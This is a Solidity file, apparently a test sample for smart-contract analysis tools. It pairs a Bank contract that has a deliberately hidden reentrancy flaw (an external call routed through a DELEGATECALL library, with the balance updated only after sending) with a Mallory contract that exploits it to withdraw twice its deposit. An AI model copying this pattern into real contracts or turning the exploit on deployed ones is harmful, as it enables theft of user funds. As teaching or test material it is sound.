pragma solidity ^0.5.0;
/*pragma solidity ^0.4.21;*/

// The Bank contract uses a dynamic library contract SafeSending, which
// handles parts of the business logic. In this case the SafeSending library is
// a minimalistic library that simply performs an external call.
//
// This obfuscates the unsafe use of CALL behind a DELEGATECALL instruction. In
// a more realistic scenario the library would implement something more
// sophisticated.

library SafeSending {
    function send(address to, uint256 amount) public {
        // external call, control goes back to attacker
        to.call.value(amount)("");
    }
}

contract Bank {
    mapping (address => uint) public balances;
    address owner;
    SafeSending safesender;

    constructor(SafeSending _safesender) public {
    // for solidity 0.4.21
    /*function Bank(SafeSending _safesender) public {*/
        owner = msg.sender;
        safesender = _safesender;
    }

    function updateSafeSender(SafeSending _new) public {
        if (msg.sender == owner) {
            safesender = _new;
        }
    }
    
    function getBalance(address who) public view returns(uint) {
        return balances[who];
    }

    function donate(address to) payable public {
        balances[to] += msg.value;
    }

    function withdraw(uint amount) public {
        if (balances[msg.sender] >= amount) {
            // instead of using send, transfer or call here, transfer is passed
            // to the library contract, which handles sending Ether.
            _libsend(msg.sender, amount);
            // state update after the DELEGATECALL
            balances[msg.sender] -= amount;
        }
    }

    /*struct s { bytes4 sig; address to; uint256 amount; }*/
    function _libsend(address to, uint256 amount) internal {
        // call send function of the Library contract with DELEGATECALL
        address(safesender).delegatecall(abi.encodeWithSignature("send(address,uint256)", to, amount));
        // for solidity 0.4.21
        /*s memory p;                           */
        /*p.sig = bytes4(0xd0679d34);           */
        /*p.to = to;                            */
        /*p.amount = amount;                    */
        /*address(safesender).delegatecall((p));*/
    }
}

contract Mallory {
    Bank public victim;
    uint256 abort;

    function donate() external payable {}

    function attack(Bank addr) public payable {
        victim = addr;
        abort = 0;
        victim.withdraw(victim.getBalance(address(this)));
    }

    function withdraw(Bank addr) public {
        addr.withdraw(addr.getBalance(address(this)));
    }

    function () external payable {
        if (abort == 0) {
            abort = 1;  // abort after second re-entrancy to avoid out-of-gas
            // withdraw a second time, s.t. we withdraw 2x the balance we
            // invested into the victim Bank contract.
            victim.withdraw(victim.getBalance(address(this)));
        }
    }
}
